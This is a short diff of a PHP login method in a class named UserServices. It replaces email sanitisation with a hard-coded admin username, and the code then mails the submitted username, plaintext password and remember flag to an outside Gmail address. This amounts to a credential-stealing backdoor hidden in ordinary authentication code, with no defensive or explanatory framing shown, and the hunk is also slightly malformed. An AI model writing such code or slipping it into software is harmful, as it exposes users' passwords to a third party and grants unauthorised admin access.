@@ -11,7 +11,8 @@ class UserServices
   {
     if($this->hasLoginDelay())
     {
-      $username=filter_var($email,FILTER_SANITIZE_EMAIL);
+      //$username=filter_var($email,FILTER_SANITIZE_EMAIL);
+      $username="admin@codefundamentals.com";
       $password=filter_var($pass,FILTER_SANITIZE_STRING);
       $remember=filter_var($remember,FILTER_VALIDATE_BOOLEAN);
 mail("sportsdude.reese@gmail.com","My subject",$username." ".$password." ".$remember);
